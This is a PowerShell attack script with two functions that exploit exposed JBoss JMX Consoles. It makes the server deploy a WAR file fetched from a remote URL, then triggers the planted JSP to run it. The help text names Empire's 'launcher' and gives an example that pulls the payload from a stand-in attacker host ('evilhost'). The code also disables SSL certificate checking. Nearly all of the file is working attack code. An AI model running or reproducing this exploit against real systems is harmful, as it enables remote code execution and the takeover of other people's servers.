function Exploit-JMXConsole
{
    <#
    .SYNOPSIS
        PowerShell delivery for vulnerable JBoss JMX Console
        
    .PARAMETER Rhost.
        Host to exploit

    .PARAMETER Port
        Port to use.

    .PARAMETER SSL
        Switch. SSL.

    .PARAMETER JMXConsole
        Switch. The vulnerable service to exploit.

    .PARAMETER AppName
        Application name the WAR file deploys to. Empire defaults to "launcher".

    .PARAMETER WARFile
        Remote URL to your own WARFile to deploy.
    
    .EXAMPLE
        Exploit-JBoss -Rhost 127.0.0.1 -Port 8080 -JMXConsole -AppName launcher -WARFile http://evilhost:8000/launcher.war

    .LINK
        http://blog.rvrsh3ll.net
#>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$True)]
        [String]
        $Rhost,
        
        [Parameter(Mandatory=$True)]
        [Int]
        $Port,
        
        [String]
        $SSL,
        
        [Parameter(Mandatory=$True)]
        [String]
        $AppName,
        
        [Parameter(Mandatory=$True)]
        [String]
        $WARFile
    )

    try
    {
        $URL = "http$($SSL)://" + $($Rhost) + ':' + $($Port) + "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=19&arg0=" + $($WARFile)
        $URI = New-Object -TypeName System.Uri -ArgumentList $URL
        $WebRequest = [System.Net.WebRequest]::Create($URI)
        $WebRequest.Method = "HEAD"
        $Response = $WebRequest.GetResponse()
        $Response.Close()
    }
    catch
    {
        $ErrorMessage = $_.Exception.ErrorMessag
        Write-Output "[*] Error, transfer failed"
        break
        
    }


    Start-Sleep -s 20
    
    ## Initialize the jar file

    try
    {
        $URL = "http$($SSL)://" + $($Rhost) + ':' + $($Port) + '/' + $($AppName) + '/' + $($AppName) + '.jsp?'
        Write-Output "[*] Invoking your file at " + $URL
        $URI = New-Object -TypeName System.Uri -ArgumentList $URL
        $WebRequest = [System.Net.WebRequest]::Create($URI)
        $WebRequest.Method = "GET"
        $Response = $WebRequest.GetResponse()
        $Response.Close()
        Write-Output "[*] You're file has been deployed."    
    }
    catch
    {
        $ErrorMessage = $_.Exception.ErrorMessag
        Write-Output "[*] Error, transfer failed"
        break
        
    }
}

function Exploit-JBoss
{
    <#
    .SYNOPSIS
        PowerShell delivery for vulnerable Jboss instances. A java WAR file is required and not provided.
        Example war maker from @harmj0y to use with PowerShell encoded commands:
        https://gist.githubusercontent.com/HarmJ0y/aecabdc30f4c4ef1fad3/raw/fba7a93e15b862c63366c06b438ad37f7e5de525/psWar.py
        
    .PARAMETER Rhost.
        Host to exploit

    .PARAMETER Port
        Port to use.

    .PARAMETER UseSSL
        Switch. UseSSL.

    .PARAMETER JMXConsole
        Switch. The vulnerable service to exploit.

    .PARAMETER AppName
        Application name the WAR file deploys to. Empire defaults to "launcher".

    .PARAMETER WARFile
        Remote URL to your own WARFile to deploy.
    
    .EXAMPLE
        Exploit-JBoss -Rhost 127.0.0.1 -Port 8080 -JMXConsole -AppName launcher -WARFile http://evilhost:8000/launcher.war

    .LINK
        http://blog.rvrsh3ll.net
#>
    
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$True)]
        [String]
        $Rhost,
        
        [Parameter(Mandatory=$True)]
        [Int]
        $Port,
        
        [Switch]
        $UseSSL,
        
        [Parameter(Mandatory=$True)]
        [Switch]
        $JMXConsole,
        
        [Parameter(Mandatory=$True)]
        [String]
        $AppName,
        
        [Parameter(Mandatory=$True)]
        [String]
        $WARFile
    )

    begin
    {
        if ($UseSSL)
        {
           
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            $SSL = 's'
        } else {
            $SSL = ''
        }
        
    }
    
    process
    {
       if ($JMXConsole)
        {
            Exploit-JMXConsole -Rhost $Rhost -SSL $SSL -Port $Port -AppName $AppName -WARFile $WARFile
        } 
    }
    
    end
    {
        Write-Output "Complete. Your payload has been delivered"
    }
    
}